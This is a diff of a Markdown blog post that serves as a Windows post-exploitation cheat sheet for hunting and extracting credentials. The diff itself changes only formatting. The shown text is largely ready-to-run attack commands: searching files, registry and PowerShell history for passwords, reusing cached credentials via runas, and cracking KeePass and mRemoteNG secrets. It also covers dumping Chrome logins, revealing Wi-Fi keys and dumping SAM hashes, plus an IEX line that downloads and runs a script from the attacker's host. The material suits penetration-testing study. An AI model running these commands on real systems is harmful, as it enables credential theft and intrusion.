@@ -1,16 +1,19 @@
 ---
-title: "Pillaging :Windows  Credential Hunting & Extraction"
+title: Pillaging :Windows  Credential Hunting & Extraction
 date: 2026-06-26 13:01:53
+
+
 categories:
   - Active Directory
   - Windows
   - Post-Exploitation
   - Windows Privesc
   - Credential Hunting
+  
 tags:
-  - Registry
   - Credential-Hunting
   - DPAPI
+  - Registry
   - KeePass
   - mRemoteNG
   - SharpChrome
@@ -18,7 +21,14 @@ tags:
   - PowerShell-History
   - Windows-Vaults
   - Browser-Credentials
+cover: /img/Windows-Credential-Hunting.png
+top_img: /img/bg-img.jpg
+description: A complete reference for hunting credentials on Windows, from registry keys and PowerShell history to LSASS dumps browser secrets
 ---
+
+
+
+
 
 # Recursive Credential Search
 
@@ -40,6 +50,7 @@ cd C:\ & findstr /S /I /N /P /C:"password" /C:"passwd" /C:"pwd" /C:"secret" /C:"
 Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.ini,*.config,*.xml,*.cfg,*.conf,*.json,*.yaml,*.yml,*.ps1,*.bat -File -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd|secret|token|apikey|api_key|connectionstring|connection string|credential"
 ```
 
+
 # Hunt for Credential Files
 
 > ➜ Search recursively for files whose names or extensions suggest they may contain credentials or connection information.
@@ -60,11 +71,13 @@ where /R C:\ *.config
 Get-ChildItem -Path C:\ -Recurse -Include *.config,*.conf,*.ini,*.xml,*.json,*.yaml,*.yml,*.rdp,*.vnc,*.cred,*.kdbx -File -ErrorAction SilentlyContinue
 ```
 
+
+
 # PowerShell History File
 
 > Default path:
 
-```plaintext
+```
 C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
@@ -74,17 +87,19 @@ C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleH
 (Get-PSReadLineOption).HistorySavePath
 ```
 
-> Read the current user’s history
+> Read the current user's history
 
 ```powershell
 gc (Get-PSReadLineOption).HistorySavePath
 ```
 
-> Read every user’s history at once
+> Read every user's history at once
 
 ```powershell
 foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
 ```
+
+
 
 # Hunt for Unattend and Sysprep Files
 
@@ -106,19 +121,22 @@ dir /S /B C:\unattend.xml C:\autounattend.xml C:\Windows\Panther\*.xml C:\Window
 C:\> type C:\Windows\Panther\Unattend.xml
 ```
 
+
 # User / Computer Description Fields
 
 > Read the description field of all local user accounts.
 
-```plaintext
+```
 PS C:\> Get-LocalUser | Select-Object Name, Description
 ```
 
 > Read the computer description field
 
-```plaintext
+```
 PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select Description
 ```
+
+
 
 # The Registry
 
@@ -148,13 +166,13 @@ Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | Get-ItemProperty -ErrorA
 
 > Enumerate saved sessions (current user)
 
-```powershell
+```PowerShell
 PS C:\> reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
 ```
 
 > Read a session and pull ProxyPassword
 
-```powershell
+```PowerShell
 PS C:\> reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<session-name>"
 
 # ProxyUsername  REG_SZ  administrator
@@ -163,9 +181,11 @@ PS C:\> reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<session-name>"
 
 > ➜ If we have administrator privileges we can enumerate PuTTY sessions for all user profiles.
 
-```plaintext
+```
 C:\> for /f "tokens=*" %a in ('reg query HKU') do @reg query "%a\SOFTWARE\SimonTatham\PuTTY\Sessions" 2>nul
 ```
+
+
 
 # PowerShell DPAPI Credential Files
 
@@ -197,11 +217,13 @@ $credential.GetNetworkCredential().Password
 
 > Note: The password can usually be decrypted only by the same user on the same machine.
 
+
+
 # Chrome Custom Dictionary
 
 > Find it across every user profile
 
-```plaintext
+```
 PS C:\> Get-ChildItem "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt" -ErrorAction SilentlyContinue
 ```
 
@@ -210,6 +232,8 @@ PS C:\> Get-ChildItem "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\
 ```powershell
 PS C:\> gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
 ```
+
+
 
 # Sticky Notes Database
 
@@ -245,21 +269,23 @@ Invoke-SqliteQuery -Database "C:\Users\<user>\AppData\Local\Packages\Microsoft.M
 strings plum.sqlite-wal
 ```
 
+
+
 # Saved Credentials & Vaults
 
 ### cmdkey Stored Credentials
 
-> Windows can cache RDP/terminal-services credentials we can’t read the plaintext, but we can reuse them.
+> Windows can cache RDP/terminal-services credentials we can't read the plaintext, but we can reuse them.
 
 ##### List cached credentials for the current user
 
-```plaintext
+```
 C:\> cmdkey /list
 ```
 
 ##### Run a command as that user with the saved credential
 
-```plaintext
+```
 PS C:\> runas /savecred /user:<domain>\<user> "<command>"
 ```
 
@@ -269,7 +295,7 @@ PS C:\> runas /savecred /user:<domain>\<user> "<command>"
 
 > Locate any KeePass DB on the host or shares
 
-```plaintext
+```
 PS C:\> Get-ChildItem -Path C:\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue
 ```
 
@@ -281,7 +307,7 @@ keepass2john <database>.kdbx > keepass_hash
 
 > Crack it offline
 
-```plaintext
+```
 hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
 ```
 
@@ -291,11 +317,11 @@ hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
 
 > Find confCons.xml for every user (generic)
 
-```plaintext
+```
 PS C:\> Get-ChildItem "C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml" -ErrorAction SilentlyContinue
 ```
 
-> If the user did not set a custom master password, we can easily decrypt all saved credentials using [mRemoteNG-Decrypt](<https://github.com/haseebT/mRemoteNG-Decrypt>)
+> If the user did not set a custom master password, we can easily decrypt all saved credentials using [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)
 
 ```bash
 ➜ python3 mremoteng_decrypt.py -s "Password_String"
@@ -307,15 +333,16 @@ PS C:\> Get-ChildItem "C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml" -Error
 ➜ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "Password_String" -p $password 2>/dev/null;done
 ```
 
+
 # Browsers
 
 ### Chrome
 
 ##### Saved Logins
 
-> We can decrypt and dump Chrome’s saved logins (current user)
+> We can decrypt and dump Chrome's saved logins (current user)
 
-```plaintext
+```
 PS C:\> .\SharpChrome.exe logins /unprotect
 ```
 
@@ -366,6 +393,8 @@ Get-ChildItem "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-rel
 ```bash
 python3 cookieextractor.py --dbpath "<path>/cookies.sqlite"
 ```
+
+
 
 # Local Credential Stores (Memory & Hives)
 
@@ -422,6 +451,8 @@ netsh wlan show profile "<profile-name>" key=clear
 ```cmd
 for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| findstr "All User Profile"') do @netsh wlan show profile name="%a" key=clear | findstr "SSID Key"
 ```
+
+
 
 # Shares, Backups & Virtual Disks
 
@@ -481,12 +512,11 @@ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 > Restic is a backup tool that can store backups of local or remote systems. If we compromise a backup server or recover the repository password, we may be able to restore files from multiple machines.
 
 > With access to a Restic repository, we can:
->
->   * Enumerate available snapshots.
->   * Browse backed-up files and folders.
->   * Restore files from multiple systems.
->   * Recover sensitive files such as registry hives, configuration files, SSH keys, and databases.
->
+> 
+> - Enumerate available snapshots.
+> - Browse backed-up files and folders.
+> - Restore files from multiple systems.
+> - Recover sensitive files such as registry hives, configuration files, SSH keys, and databases.
 
 ##### Recover the Repository Password
 
@@ -585,6 +615,7 @@ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 Administrator:500:aad3b435b51404ee:<SNIP>:bac9dc5bc04b477f26:::
 ```
 
+
 ## Live Process Command-Line Monitoring
 
 > Monitor running processes and display newly started processes with their command-line arguments, this can reveal credentials passed to scheduled tasks, services, or scripts at runtime.
@@ -606,6 +637,7 @@ Compare-Object -ReferenceObject $process -DifferenceObject $process2
 ```powershell
 IEX (iwr 'http://<our-ip>/procmon.ps1')
 ```
+
 
 ## Clipboard Monitoring
 
